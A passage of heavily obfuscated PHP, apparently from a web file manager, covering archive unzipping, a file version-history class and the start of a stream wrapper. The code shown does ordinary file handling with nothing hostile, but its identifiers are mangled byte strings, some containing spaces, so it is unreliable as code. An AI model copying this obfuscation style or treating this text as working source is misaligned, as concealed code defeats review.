get_path_ext($ğéïèëÑ[$ÌÚØ½Ä„[230]]); $Ç½¶°™ğ = KodArchive::listContent(self::iconvSystem($ğéïèëÑ[$ÌÚØ½Ä„[230]]), !0, $ÛˆÀâûÇ); self::unzipErrorCheck($Ç½¶°™ğ, array($ÌÚØ½Ä„[1286], $üúØ‹·¾, $ğéïèëÑ)); @file_put_contents($¹ğª¼»õ, json_encode($Ç½¶°™ğ[$ÌÚØ½Ä„[1287]])); } return @json_decode(IO::getContent($¹ğª¼»õ), !0); } IO::fileOut($ğéïèëÑ[$ÌÚØ½Ä„[230]], $Õš¬†¶Ÿ, get_path_this($õâÙ­˜ƒ[$ÌÚØ½Ä„[32]])); die; } private static function zipFileList($•Ïˆ¥Úü, $á‚ÎÂş = false) { $èÀúõ =& $_SERVER[¦»×‡Ãã]; $® §‹Ää = array(); foreach ($•Ïˆ¥Úü as $ÜØÊçÀ•) { $¤õ«ºªá = $ÜØÊçÀ•[$èÀúõ[87]]; if ($á‚ÎÂş) { $¤õ«ºªá = self::copy($ÜØÊçÀ•[$èÀúõ[87]], $á‚ÎÂş, $èÀúõ[891]); } else { $¯Ö€ÜÁò = self::init($ÜØÊçÀ•[$èÀúõ[87]]); if ($¯Ö€ÜÁò->getType() == $èÀúõ[109]) { $¤õ«ºªá = $¯Ö€ÜÁò->path; } } if ($¤õ«ºªá && self::local()->exist($¤õ«ºªá)) { $® §‹Ää[$ÜØÊçÀ•[$èÀúõ[87]]] = $¤õ«ºªá; } } if (!empty($® §‹Ää)) { return array_values($® §‹Ää); } show_json(LNG($èÀúõ[1246]), !1); } private static function localFilePath($ã†ñöÕ) { $ÀüÆÀ€ =& $_SERVER[¦»×‡Ãã]; $¥ùèµÔœ = KodIO::parse($ã†ñöÕ); if ($¥ùèµÔœ[$ÀüÆÀ€[33]] == KodIO::KOD_SOURCE) { $€ÇŠ‚§ó = Model($ÀüÆÀ€[897])->fileInfoGet(KodIO::sourceID($ã†ñöÕ)); if (!$€ÇŠ‚§ó[$ÀüÆÀ€[87]]) { show_json($ÀüÆÀ€[1288], !1); } $ã†ñöÕ = $€ÇŠ‚§ó[$ÀüÆÀ€[87]]; } $ÄÌ×¸” = self::init($ã†ñöÕ); if ($ÄÌ×¸”->pathParse[$ÀüÆÀ€[1232]]) { $ã†ñöÕ = $ÄÌ×¸”->pathParse[$ÀüÆÀ€[1232]]; $ÄÌ×¸” = self::init($ã†ñöÕ); } $âŠÆùƒÈ = $ÄÌ×¸”->getType(); if ($âŠÆùƒÈ == $ÀüÆÀ€[109] || $âŠÆùƒÈ == $ÀüÆÀ€[1289]) { if (!$ÄÌ×¸”->exist($ÄÌ×¸”->path)) { show_json(LNG($ÀüÆÀ€[108]), !1); } return $ÄÌ×¸”->path; } return !1; } public static function unzipPart($âÑ‡¶¹Ï, $Ñšú Š = -1) { $³”‡–©è =& $_SERVER[¦»×‡Ãã]; $ÍûÓº = IO::pathThis($âÑ‡¶¹Ï); if (!$Ñšú Š || $Ñšú Š == -1) { $¯ğ€£İ‚ = array(array($³”‡–©è[32] => $ÍûÓº, $³”‡–©è[1275] => -1)); $¯ğ€£İ‚[0][$³”‡–©è[1290]] = $¯ğ€£İ‚[0][$³”‡–©è[32]]; } else { if (is_array($Ñšú Š)) { $¯ğ€£İ‚ = $Ñšú Š; $î˜¾ÓÍ† = count($¯ğ€£İ‚) - 1; for ($ÊìŞÉ©ü = 0; $ÊìŞÉ©ü <= $î˜¾ÓÍ†; $ÊìŞÉ©ü++) { $­ëËÌõÑ = $¯ğ€£İ‚[$ÊìŞÉ©ü]; $†­Ÿ¼—÷ = get_path_this($­ëËÌõÑ[$³”‡–©è[32]]) . (checkExtSafe($­ëËÌõÑ[$³”‡–©è[32]]) ? $³”‡–©è[12] : $³”‡–©è[1291]); $¯ğ€£İ‚[$ÊìŞÉ©ü][$³”‡–©è[1290]] = $³”‡–©è[1292] . intval($­ëËÌõÑ[$³”‡–©è[1275]]) . $³”‡–©è[462] . $†­Ÿ¼—÷; if ($ÊìŞÉ©ü == 0) { continue; } $¯ğ€£İ‚[$ÊìŞÉ©ü][$³”‡–©è[1290]] = $¯ğ€£İ‚[$ÊìŞÉ©ü - 1][$³”‡–©è[1290]] . $³”‡–©è[1293] . $¯ğ€£İ‚[$ÊìŞÉ©ü][$³”‡–©è[1290]]; } } } if (!is_array($¯ğ€£İ‚) || count($¯ğ€£İ‚) == 0) { return !1; } $ö¸òèèé = $¯ğ€£İ‚[count($¯ğ€£İ‚) - 1]; if (!IO::exist($âÑ‡¶¹Ï)) { return !1; } $Ú¬ˆ¹¶© = TEMP_FILES . $³”‡–©è[1294] . kodIO::hashPathSafe($âÑ‡¶¹Ï) . $³”‡–©è[8]; $é„å°“™ = $Ú¬ˆ¹¶© . $ö¸òèèé[$³”‡–©è[1290]]; mk_dir($Ú¬ˆ¹¶©); file_put_contents(TEMP_FILES . $³”‡–©è[1266], $³”‡–©è[12]); if (IO::exist($é„å°“™)) { return array($³”‡–©è[230] => $é„å°“™, $³”‡–©è[1274] => $¯ğ€£İ‚, $³”‡–©è[1276] => $Ú¬ˆ¹¶©); } $“–ÈØÙ¼ = self::localFilePath($âÑ‡¶¹Ï); if (!$“–ÈØÙ¼) { $“–ÈØÙ¼ = $Ú¬ˆ¹¶© . $³”‡–©è[1295]; if (!IO::exist($“–ÈØÙ¼)) { self::copy($âÑ‡¶¹Ï, $Ú¬ˆ¹¶©, !1, get_path_this($“–ÈØÙ¼)); } } if (!$“–ÈØÙ¼ || !IO::exist($“–ÈØÙ¼)) { return !1; } if ($ö¸òèèé[$³”‡–©è[1275]] == -1) { return array($³”‡–©è[230] => $“–ÈØÙ¼, $³”‡–©è[1274] => $¯ğ€£İ‚, $³”‡–©è[1276] => $Ú¬ˆ¹¶©); } $Ÿ™©ÊŒˆ = $“–ÈØÙ¼; foreach ($¯ğ€£İ‚ as $ÊìŞÉ©ü => $­ëËÌõÑ) { if (!$­ëËÌõÑ || $­ëËÌõÑ[$³”‡–©è[1275]] == $³”‡–©è[1273]) { break; } if (substr($­ëËÌõÑ[$³”‡–©è[32]], -1, 1) == $³”‡–©è[8]) { break; } $è¾ÔÅı = in_array(get_path_ext($­ëËÌõÑ[$³”‡–©è[1290]]), array($³”‡–©è[389], $³”‡–©è[1280], $³”‡–©è[1281], $³”‡–©è[1282], $³”‡–©è[1283], $³”‡–©è[1284])); $™ŒöˆÅ = $ÊìŞÉ©ü == count($¯ğ€£İ‚) - 1 && $è¾ÔÅı; $ëáò”©º = $Ú¬ˆ¹¶© . $­ëËÌõÑ[$³”‡–©è[1290]]; $¹Û†£‹ñ = $Ú¬ˆ¹¶© . get_path_this($­ëËÌõÑ[$³”‡–©è[32]]); if (IO::exist($ëáò”©º)) { $Ÿ™©ÊŒˆ = $ëáò”©º; continue; } $Â€Ôü = $ÊìŞÉ©ü == 0 ? get_path_ext($ÍûÓº) : get_path_ext($Ÿ™©ÊŒˆ); $­é»âÉ€ = KodArchive::extract(self::iconvSystem($Ÿ™©ÊŒˆ), $Ú¬ˆ¹¶©, $­ëËÌõÑ[$³”‡–©è[1275]], $¡ä „‹Ø, $Â€Ôü); self::unzipErrorCheck($­é»âÉ€, array($³”‡–©è[1296], $âÑ‡¶¹Ï, $¯ğ€£İ‚, $­ëËÌõÑ, $ëáò”©º)); if (IO::exist($¹Û†£‹ñ)) { IO::rename($¹Û†£‹ñ, get_path_this($ëáò”©º)); } $Ÿ™©ÊŒˆ = $ëáò”©º; } $é„å°“™ = $Ÿ™©ÊŒˆ; return array($³”‡–©è[230] => $Ÿ™©ÊŒˆ, $³”‡–©è[1274] => $¯ğ€£İ‚, $³”‡–©è[1276] => $Ú¬ˆ¹¶©); } private static function unzipErrorCheck($›¯˜ª•, $èéíƒŸ« = false) { $½øöñ¨Ñ =& $_SERVER[¦»×‡Ãã]; if ($›¯˜ª•[$½øöñ¨Ñ[1297]]) { return !0; } write_log(array($½øöñ¨Ñ[1298], $›¯˜ª•, $èéíƒŸ«), $½øöñ¨Ñ[1299]); show_json($½øöñ¨Ñ[1300] . json_encode($›¯˜ª•[$½øöñ¨Ñ[1287]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ô™ø¼Øè =& $_SERVER[¦»×‡Ãã]; $àäß«úµ = $GLOBALS[$Ô™ø¼Øè[6]][$Ô™ø¼Øè[92]]; if ($àäß«úµ[$Ô™ø¼Øè[1301]] != 1) { return; } if ($àäß«úµ[$Ô™ø¼Øè[1302]] <= 0) { return; } if (isset($_REQUEST[$Ô™ø¼Øè[1303]]) && $_REQUEST[$Ô™ø¼Øè[1303]] == $Ô™ø¼Øè[91]) { return; } Hook::bind($Ô™ø¼Øè[1304], $Ô™ø¼Øè[1305]); Hook::bind($Ô™ø¼Øè[1306], $Ô™ø¼Øè[1307]); Hook::bind($Ô™ø¼Øè[1308], $Ô™ø¼Øè[1309]); Hook::bind($Ô™ø¼Øè[1310], $Ô™ø¼Øè[1311]); Hook::bind($Ô™ø¼Øè[1312], $Ô™ø¼Øè[1313]); Hook::bind($Ô™ø¼Øè[1314], $Ô™ø¼Øè[1315]); } public static function eventBeforeUpload($¹©Û­ Š) { if ($¹©Û­ Š[3] && $¹©Û­ Š[3] != REPEAT_REPLACE) { return; } $º…ª†˜à = self::parsePath($¹©Û­ Š[0]); if (!$º…ª†˜à) { return; } self::add($º…ª†˜à); } public static function eventBeforeEdit($×÷¢˜øŒ) { $—­«ô˜ = self::parsePath($×÷¢˜øŒ[0]); if (!$—­«ô˜) { return; } self::add($—­«ô˜); } public static function eventBeforeCopyFile($îªŒÕºÏ, $°«Äîº‡, $Ğæšü»’, $àÃÏ­Ã, $Øµ÷èÅ“, $Íè°õ) { $Œş¥²Ëæ =& $_SERVER[¦»×‡Ãã]; if (isset($Ğæšü»’->_data[$Œş¥²Ëæ[1236]]) && $Ğæšü»’->_data[$Œş¥²Ëæ[1236]]) { return; } $úÙò¨‹º = $Ğæšü»’->getPathOuter($àÃÏ­Ã); $ê¹éô²ı = self::parsePath($úÙò¨‹º); if (!$ê¹éô²ı) { return; } self::add($ê¹éô²ı); } public static function eventBeforeRename($şşˆ¸ø¢) { $°Àˆ‡ìñ =& $_SERVER[¦»×‡Ãã]; $¿€í¾ = self::parsePath($şşˆ¸ø¢[0]); if (!$¿€í¾) { return; } $Ö„ğº¶³ = self::checkInHistory($¿€í¾); if (!$Ö„ğº¶³) { return; } if ($Ö„ğº¶³[$°Àˆ‡ìñ[33]] == $°Àˆ‡ìñ[230]) { $¨ÅÓàú™ = self::listData($¿€í¾); if ($¨ÅÓàú™ && $¨ÅÓàú™[$°Àˆ‡ìñ[445]]) { self::moveHistory($¿€í¾, $şşˆ¸ø¢[1]); } } else { IO::rename($Ö„ğº¶³[$°Àˆ‡ìñ[87]], $şşˆ¸ø¢[1]); } } public static function eventBeforeMove($Í–À¿›İ) { $È²†á±¦ =& $_SERVER[¦»×‡Ãã]; $©Ë”·­– = self::parsePath($Í–À¿›İ[0]); if (!$©Ë”·­–) { return; } $æ´Ä·À = self::parsePath($Í–À¿›İ[1]); if (!$æ´Ä·À) { return; } $´Ä»Áß = $Í–À¿›İ[3]; $¯š¡È·Õ = self::checkInHistory($©Ë”·­–); if (!$¯š¡È·Õ) { return; } $Ú•ÒÕ¢ = self::pathHistory($æ´Ä·À); if ($¯š¡È·Õ[$È²†á±¦[33]] == $È²†á±¦[230]) { $›õ×²¿á = self::listData($©Ë”·­–); $¨€ëˆÀß = rtrim($æ´Ä·À, $È²†á±¦[8]) . $È²†á±¦[8] . ($´Ä»Áß ? $´Ä»Áß : get_path_this($©Ë”·­–)); $ö¶ß¿ = self::listData($¨€ëˆÀß); if ($›õ×²¿á && $›õ×²¿á[$È²†á±¦[445]] && $ö¶ß¿ && $ö¶ß¿[$È²†á±¦[445]]) { return self::clear($©Ë”·­–); } if ($›õ×²¿á && $›õ×²¿á[$È²†á±¦[445]]) { self::moveHistory($©Ë”·­–, $´Ä»Áß, $Ú•ÒÕ¢); } } else { IO::move($¯š¡È·Õ[$È²†á±¦[87]], $Ú•ÒÕ¢, !1, $´Ä»Áß); self::clearEmptyFolder(IO::pathFather($¯š¡È·Õ[$È²†á±¦[87]])); } } public static function eventAfterRemove($ã©Š¾Åó, $•øšäìç) { $âÄ¶œ•Ó =& $_SERVER[¦»×‡Ãã]; if (!$•øšäìç) { return; } $ª–ÁõÎ = self::parsePath($ã©Š¾Åó[0]); if (!$ª–ÁõÎ) { return; } $ÌÙ‹Ä¿Î = self::checkInHistory($ª–ÁõÎ); if (!$ÌÙ‹Ä¿Î) { return; } if ($ÌÙ‹Ä¿Î[$âÄ¶œ•Ó[33]] == $âÄ¶œ•Ó[230]) { $ˆâéŞ”‰ = self::listData($ª–ÁõÎ, !1); if ($ˆâéŞ”‰ && $ˆâéŞ”‰[$âÄ¶œ•Ó[445]]) { self::clear($ª–ÁõÎ, !1); } } else { IO::remove($ÌÙ‹Ä¿Î[$âÄ¶œ•Ó[87]]); self::clearEmptyFolder(IO::pathFather($ÌÙ‹Ä¿Î[$âÄ¶œ•Ó[87]])); } } private static function checkInHistory($‘Û¯¬Öê) { $Ò¹óõëß = self::pathHistory($‘Û¯¬Öê); if (!IO::exist($Ò¹óõëß)) { $Ò¹óõëß .= $_SERVER[¦»×‡Ãã][1316]; } return IO::exist($Ò¹óõëß) ? IO::info($Ò¹óõëß) : !1; } private static function parsePath($¶Öé”ƒì) { $ƒôËº‡´ =& $_SERVER[¦»×‡Ãã]; if (!$¶Öé”ƒì) { return !1; } if (isset($GLOBALS[$ƒôËº‡´[1317]]) && $GLOBALS[$ƒôËº‡´[1317]]) { return; } $ë‘§îÖ = KodIO::parse($¶Öé”ƒì); $òÅõ¡Æ = $ë‘§îÖ[$ƒôËº‡´[33]]; $ÕÃü”Ë® = !$òÅõ¡Æ || $òÅõ¡Æ == KodIO::KOD_IO || $òÅõ¡Æ == KodIO::KOD_SHARE_ITEM; if (!$ÕÃü”Ë® || !$ë‘§îÖ[$ƒôËº‡´[1318]]) { return !1; } if (substr($¶Öé”ƒì, 0, strlen(DATA_PATH . $ƒôËº‡´[1319])) == DATA_PATH . $ƒôËº‡´[1319]) { return !1; } if ($òÅõ¡Æ == KodIO::KOD_SHARE_ITEM) { $Æı¦ŸÖ­ = IO::init($¶Öé”ƒì); if ($Æı¦ŸÖ­->pathParse[$ƒôËº‡´[1232]]) { return self::parsePath($Æı¦ŸÖ­->pathParse[$ƒôËº‡´[1232]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Óºú¨µä = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ƒôËº‡´[1320]); foreach ($Óºú¨µä as $¯É…¤×) { if (!$òÅõ¡Æ && substr($¶Öé”ƒì, 0, strlen($¯É…¤×)) == $¯É…¤×) { return !1; } } self::log($GLOBALS[$ƒôËº‡´[1227]] . $ƒôËº‡´[1321] . $¶Öé”ƒì); return $¶Öé”ƒì; } private static function pathHistory($Šâù«©í) { $Õ­–™¯¹ =& $_SERVER[¦»×‡Ãã]; $‹‰¸¬ô² = self::$_historyBase . ltrim(KodIO::clear($Šâù«©í), $Õ­–™¯¹[8]); $‹‰¸¬ô² = str_replace(array($Õ­–™¯¹[1322]), array($Õ­–™¯¹[1323]), $‹‰¸¬ô²); return $‹‰¸¬ô²; } public static function log($©¢ò¾Ş¬) { } public static function historyCount($£‚€½­ò) { $²û¶Å « =& $_SERVER[¦»×‡Ãã]; $Şõœòıë = array(); $–´¥µõğ = array(); foreach ($£‚€½­ò as $´áô…ƒ¿) { $šú†÷‰É = get_path_father($´áô…ƒ¿); if (!$–´¥µõğ[$šú†÷‰É]) { $–´¥µõğ[$šú†÷‰É] = array(); } $–´¥µõğ[$šú†÷‰É][] = get_path_this($´áô…ƒ¿); } foreach ($–´¥µõğ as $šú†÷‰É => $»ÏĞ£Óå) { $öË¾øßÕ = self::parsePath($šú†÷‰É); if (!$öË¾øßÕ) { continue; } foreach ($»ÏĞ£Óå as $”Î) { $„Ûöº« = self::listData(rtrim($öË¾øßÕ, $²û¶Å «[8]) . $²û¶Å «[8] . $”Î, !1); if ($„Ûöº« && $„Ûöº«[$²û¶Å «[445]]) { $Şõœòıë[rtrim($šú†÷‰É, $²û¶Å «[8]) . $²û¶Å «[8] . $”Î] = count($„Ûöº«[$²û¶Å «[445]]); } } } return $Şõœòıë; } public static function add($šÏ•“”Š) { $ç·Õ‘”— =& $_SERVER[¦»×‡Ãã]; $–éß²éé = self::listData($šÏ•“”Š); if (!$–éß²éé) { return; } $¾§ßÉĞŠ = Model($ç·Õ‘”—[843])->get($ç·Õ‘”—[1324]); $Õ«ßŸ±ê = intval($GLOBALS[$ç·Õ‘”—[6]][$ç·Õ‘”—[92]][$ç·Õ‘”—[1302]]); $Ÿ€Ã¤…© = $¾§ßÉĞŠ == $ç·Õ‘”—[1325] ? min(5, $Õ«ßŸ±ê) : $Õ«ßŸ±ê; if ($Õ«ßŸ±ê <= 0) { return; } $¬…ç°ÒÎ = IO::info($šÏ•“”Š); $ºäû—çÓ = $–éß²éé[$ç·Õ‘”—[445]]; if ($¬…ç°ÒÎ[$ç·Õ‘”—[79]] == 0) { return; } if ($¬…ç°ÒÎ[$ç·Õ‘”—[79]] >= 1024 * 1024 * 500) { return !1; } $Ëƒı™ùÔ = IO::hashSimple($šÏ•“”Š); if ($ºäû—çÓ && $ºäû—çÓ[0][$ç·Õ‘”—[672]] == $Ëƒı™ùÔ) { return !0; } if (array_key_exists($ç·Õ‘”—[233], $¬…ç°ÒÎ) && !$¬…ç°ÒÎ[$ç·Õ‘”—[233]]) { return !1; } $œùÕ“ıå = short_id(time()); $Ôáİß®î = array($ç·Õ‘”—[475] => $œùÕ“ıå, $ç·Õ‘”—[672] => $Ëƒı™ùÔ, $ç·Õ‘”—[32] => $¬…ç°ÒÎ[$ç·Õ‘”—[32]] . $ç·Õ‘”—[10] . date($ç·Õ‘”—[1326]) . rand_string(1), $ç·Õ‘”—[79] => $¬…ç°ÒÎ[$ç·Õ‘”—[79]], $ç·Õ‘”—[527] => USER_ID, $ç·Õ‘”—[231] => time(), $ç·Õ‘”—[1327] => $ç·Õ‘”—[12]); IO::mkdir($–éß²éé[$ç·Õ‘”—[1328]]); $§„»š¯º = IO::copy($šÏ•“”Š, $–éß²éé[$ç·Õ‘”—[1328]], !1, $Ôáİß®î[$ç·Õ‘”—[32]]); if (!$§„»š¯º) { self::clearEmptyFolder($–éß²éé[$ç·Õ‘”—[1328]]); return !1; } array_unshift($ºäû—çÓ, $Ôáİß®î); if (count($ºäû—çÓ) > $Ÿ€Ã¤…©) { $ûîáõ©Õ = array_slice($ºäû—çÓ, $Ÿ€Ã¤…©); foreach ($ûîáõ©Õ as $ÖïıÖ„´) { IO::remove($–éß²éé[$ç·Õ‘”—[1328]] . $ÖïıÖ„´[$ç·Õ‘”—[32]]); } $ºäû—çÓ = array_slice($ºäû—çÓ, 0, $Ÿ€Ã¤…©); } return self::saveData($–éß²éé[$ç·Õ‘”—[1329]], $ºäû—çÓ); } public static function remove($ßß¶§¯¿, $À¯¯ü®Ó) { $Ùù’ù¥“ =& $_SERVER[¦»×‡Ãã]; $ìÏ²›Ô… = self::listData($ßß¶§¯¿); $¾ÊìˆÌ = array(); if (!$ìÏ²›Ô…) { return !1; } foreach ($ìÏ²›Ô…[$Ùù’ù¥“[445]] as $ğçÅèÏò) { if ($ğçÅèÏò[$Ùù’ù¥“[475]] == $À¯¯ü®Ó) { IO::remove($ìÏ²›Ô…[$Ùù’ù¥“[1328]] . $ğçÅèÏò[$Ùù’ù¥“[32]]); continue; } $¾ÊìˆÌ[] = $ğçÅèÏò; } return self::saveData($ìÏ²›Ô…[$Ùù’ù¥“[1329]], $¾ÊìˆÌ); } public static function clear($§ö¢ô£î, $ÖŞ‰°‡ = true) { $¿¾ÄÛ÷¯ =& $_SERVER[¦»×‡Ãã]; $°À‹ú÷ = self::listData($§ö¢ô£î, $ÖŞ‰°‡); if (!$°À‹ú÷) { return !1; } foreach ($°À‹ú÷[$¿¾ÄÛ÷¯[445]] as $Ñ¼²æú×) { IO::remove($°À‹ú÷[$¿¾ÄÛ÷¯[1328]] . $Ñ¼²æú×[$¿¾ÄÛ÷¯[32]]); } return self::saveData($°À‹ú÷[$¿¾ÄÛ÷¯[1329]], array()); } public static function moveHistory($ò…¶íÚ§, $öĞ’Üßå = '', $èøã¯· = '') { $Ï½ëáÑ =& $_SERVER[¦»×‡Ãã]; $±å™¿„Å = self::listData($ò…¶íÚ§, !1); if (!$±å™¿„Å || !$±å™¿„Å[$Ï½ëáÑ[445]]) { return !1; } $Ö—Î¨Œ— = $Ï½ëáÑ[1316]; $öĞ’Üßå = $öĞ’Üßå ? $öĞ’Üßå : get_path_this($ò…¶íÚ§); $èøã¯· = $èøã¯· ? $èøã¯· : $±å™¿„Å[$Ï½ëáÑ[1328]]; $¾ìæ„Êª = substr(get_path_this($±å™¿„Å[$Ï½ëáÑ[1329]]), 0, -strlen($Ö—Î¨Œ—)); foreach ($±å™¿„Å[$Ï½ëáÑ[445]] as $èÄÕ¯ç => $’Ş–‰ö) { $ùõ­˜¶ = $öĞ’Üßå . substr($’Ş–‰ö[$Ï½ëáÑ[32]], strlen($¾ìæ„Êª)); $‡Ş›ÄÎß = IO::move($±å™¿„Å[$Ï½ëáÑ[1328]] . $’Ş–‰ö[$Ï½ëáÑ[32]], $èøã¯·, !1, $ùõ­˜¶); if ($‡Ş›ÄÎß) { $±å™¿„Å[$Ï½ëáÑ[445]][$èÄÕ¯ç][$Ï½ëáÑ[32]] = $ùõ­˜¶; } } $±å™¿„Å[$Ï½ëáÑ[1329]] = IO::move($±å™¿„Å[$Ï½ëáÑ[1329]], $èøã¯·, !1, $öĞ’Üßå . $Ö—Î¨Œ—); self::saveData($±å™¿„Å[$Ï½ëáÑ[1329]], $±å™¿„Å[$Ï½ëáÑ[445]]); self::clearEmptyFolder($±å™¿„Å[$Ï½ëáÑ[1328]]); } public static function rollback($¼„¬×ì, $ÎÂê‡Ú) { $”³”ùŒ =& $_SERVER[¦»×‡Ãã]; $èåû¬º± = self::listData($¼„¬×ì); if (!$èåû¬º±) { return; } $¯›ìíì¯ = IO::info($¼„¬×ì); foreach ($èåû¬º±[$”³”ùŒ[445]] as $ŞãªŞÎ† => $À“å†×Ê) { if ($À“å†×Ê[$”³”ùŒ[475]] == $ÎÂê‡Ú) { self::add($¼„¬×ì); $›ôíßÂÇ = $èåû¬º±[$”³”ùŒ[1328]] . $À“å†×Ê[$”³”ùŒ[32]]; $Ÿâ„®Ö = IO::copy($›ôíßÂÇ, IO::pathFather($¼„¬×ì), REPEAT_REPLACE, $¯›ìíì¯[$”³”ùŒ[32]]); if ($Ÿâ„®Ö) { self::remove($¼„¬×ì, $ÎÂê‡Ú); } return $Ÿâ„®Ö; } } return !1; } public static function setDetail($Æó¨ëÉ§, $ßØ©Ü§², $¬‹ŠªÀ) { $Œ£—ú÷ƒ =& $_SERVER[¦»×‡Ãã]; $…Ìú„³™ = self::listData($Æó¨ëÉ§); if (!$…Ìú„³™) { return; } foreach ($…Ìú„³™[$Œ£—ú÷ƒ[445]] as $úÔ¹ÚÌ  => $÷¥ˆì÷›) { if ($÷¥ˆì÷›[$Œ£—ú÷ƒ[475]] == $ßØ©Ü§²) { $…Ìú„³™[$Œ£—ú÷ƒ[445]][$úÔ¹ÚÌ ][$Œ£—ú÷ƒ[1327]] = $¬‹ŠªÀ; self::saveData($…Ìú„³™[$Œ£—ú÷ƒ[1329]], $…Ìú„³™[$Œ£—ú÷ƒ[445]]); return !0; } } return !1; } public static function fileInfo($üÚáĞó¼, $Øøéş©Ò) { $æ¯Ë«êô =& $_SERVER[¦»×‡Ãã]; $˜Ö·…æ = self::listData($üÚáĞó¼); if (!$˜Ö·…æ) { show_json(LNG($æ¯Ë«êô[108]), !1); } $Ø¨Â´õ« = $æ¯Ë«êô[12]; foreach ($˜Ö·…æ[$æ¯Ë«êô[445]] as $òÏ‰‚µã => $¼ûºøº¾) { if ($¼ûºøº¾[$æ¯Ë«êô[475]] != $Øøéş©Ò) { continue; } $Ø¨Â´õ« = $˜Ö·…æ[$æ¯Ë«êô[1328]] . $¼ûºøº¾[$æ¯Ë«êô[32]]; break; } if (!$Ø¨Â´õ«) { show_json(LNG($æ¯Ë«êô[108]), !1); } return IO::info($Ø¨Â´õ«); } public static function fileOut($ƒîáÚ££, $’Óğ¬üŞ, $ù€ñà‡Å = false) { $öôñ¢úâ =& $_SERVER[¦»×‡Ãã]; $ĞßÂ‡Å€ = self::fileInfo($ƒîáÚ££, $’Óğ¬üŞ); $ ÃŞï´ =& $GLOBALS[$öôñ¢úâ[7]]; $ù€ñà‡Å = isset($ ÃŞï´[$öôñ¢úâ[1279]]) && $ ÃŞï´[$öôñ¢úâ[1279]] == 1; if (isset($ ÃŞï´[$öôñ¢úâ[33]]) && $ ÃŞï´[$öôñ¢úâ[33]] == $öôñ¢úâ[1330]) { return IO::fileOutImage($ĞßÂ‡Å€[$öôñ¢úâ[87]], $ ÃŞï´[$öôñ¢úâ[1331]]); } IO::fileOut($ĞßÂ‡Å€[$öôñ¢úâ[87]], $ù€ñà‡Å, get_path_this($ƒîáÚ££)); } public static function listData($¼à„µ², $Øƒ¯ëÍŸ = true) { $¼ÍË–ƒ =& $_SERVER[¦»×‡Ãã]; if ($Øƒ¯ëÍŸ && !IO::exist($¼à„µ²)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¼à„µ², 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $·¥ÃçÒ¼ = self::pathHistory($¼à„µ²); $³¡Ö°ïå = array($¼ÍË–ƒ[1329] => $·¥ÃçÒ¼ . $¼ÍË–ƒ[1316], $¼ÍË–ƒ[1328] => rtrim(get_path_father($·¥ÃçÒ¼), $¼ÍË–ƒ[8]) . $¼ÍË–ƒ[8], $¼ÍË–ƒ[445] => array()); $Ïè®‰—¯ = IO::getContent($³¡Ö°ïå[$¼ÍË–ƒ[1329]]); if ($Ïè®‰—¯) { $ğ Üƒù¸ = json_decode($Ïè®‰—¯, !0); if (is_array($ğ Üƒù¸)) { $³¡Ö°ïå[$¼ÍË–ƒ[445]] = $ğ Üƒù¸; } } return $³¡Ö°ïå; } private static function saveData($Ğõ³åŸÍ, $Üà¥¯ÊÑ) { $ûë—Ë¬ =& $_SERVER[¦»×‡Ãã]; self::log($ûë—Ë¬[1332] . $Ğõ³åŸÍ . $ûë—Ë¬[74] . count($Üà¥¯ÊÑ), $ûë—Ë¬[825]); if ($Üà¥¯ÊÑ) { return IO::setContent($Ğõ³åŸÍ, json_encode($Üà¥¯ÊÑ)); } $·Ö–š‡ï = IO::pathFather($Ğõ³åŸÍ); IO::remove($Ğõ³åŸÍ); self::clearEmptyFolder($·Ö–š‡ï); return !0; } public static function clearEmptyFolder($•úÈ¹ª) { $Ã¡½ƒÉ÷ =& $_SERVER[¦»×‡Ãã]; if (trim($•úÈ¹ª, $Ã¡½ƒÉ÷[8]) == trim(self::$_historyBase, $Ã¡½ƒÉ÷[8])) { return; } $‚œ§¤œÏ = IO::pathFather($•úÈ¹ª); $Ô×á«Æ© = IO::has($•úÈ¹ª, !0); if ($Ô×á«Æ©[$Ã¡½ƒÉ÷[239]] > 0 || $Ô×á«Æ©[$Ã¡½ƒÉ÷[240]] > 0) { return; } IO::remove($•úÈ¹ª); self::clearEmptyFolder($‚œ§¤œÏ); } private static function getBasePath() { $ç‡éÖñ =& $_SERVER[¦»×‡Ãã]; $ëë„ÁÜ = Model($ç‡éÖñ[1333])->get($ç‡éÖñ[1334]); if ($ëë„ÁÜ) { if (!IO::exist($ëë„ÁÜ)) { IO::mkdir($ëë„ÁÜ); } if (get_path_this($ëë„ÁÜ) == $ç‡éÖñ[1319]) { $ºò¹†±’ = $ç‡éÖñ[1335] . rand_string(8); @rename($ëë„ÁÜ, get_path_father($ëë„ÁÜ) . $ç‡éÖñ[8] . $ºò¹†±’); $ëë„ÁÜ = DATA_PATH . $ºò¹†±’ . $ç‡éÖñ[8]; file_put_contents(DATA_PATH . $ç‡éÖñ[1266], $ç‡éÖñ[12]); Model($ç‡éÖñ[1333])->set($ç‡éÖñ[1334], $ëë„ÁÜ); } return $ëë„ÁÜ; } $ëë„ÁÜ = DATA_PATH . $ç‡éÖñ[1335] . rand_string(8) . $ç‡éÖñ[8]; $ëë„ÁÜ = IO::mkdir($ëë„ÁÜ); $ëë„ÁÜ = rtrim($ëë„ÁÜ, $ç‡éÖñ[8]) . $ç‡éÖñ[8]; file_put_contents($ëë„ÁÜ . $ç‡éÖñ[1266], $ç‡éÖñ[12]); file_put_contents(DATA_PATH . $ç‡éÖñ[1266], $ç‡éÖñ[12]); Model($ç‡éÖñ[1333])->set($ç‡éÖñ[1334], $ëë„ÁÜ); return $ëë„ÁÜ; } } goto c­‹–‘¦İ®; dÖ‚Øİá³: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($•Œ±ùı”, $ìµßæñÏ = '') { $this->info = $this->info($•Œ±ùı”); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¦»×‡Ãã][87]]; $this->pathOpen = $•Œ±ùı”; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$•Œ±ùı”])) { self::$_chunkBuffer[$•Œ±ùı”] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function 